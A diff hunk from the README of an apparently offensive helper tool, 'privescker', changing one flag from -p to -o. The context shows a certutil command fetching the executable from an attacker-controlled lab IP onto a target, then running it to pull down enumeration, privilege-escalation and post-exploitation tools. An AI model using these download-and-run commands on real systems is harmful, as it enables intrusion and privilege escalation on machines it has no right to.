@@ -85,7 +85,7 @@ certutil -urlcache -f http://10.10.14.12:8000/privescker.exe c:\users\public\pri
 Leaving your webserver running, just execute privescker like this to get all your favourite tools.
 
 ```
-privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -p c:\users\public
+privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -o c:\users\public
 ```
 
 That is literally it - small simple tool to make life easier with getting all your common enumeration, privesc and post exploitation tools on the machine for you in one go.
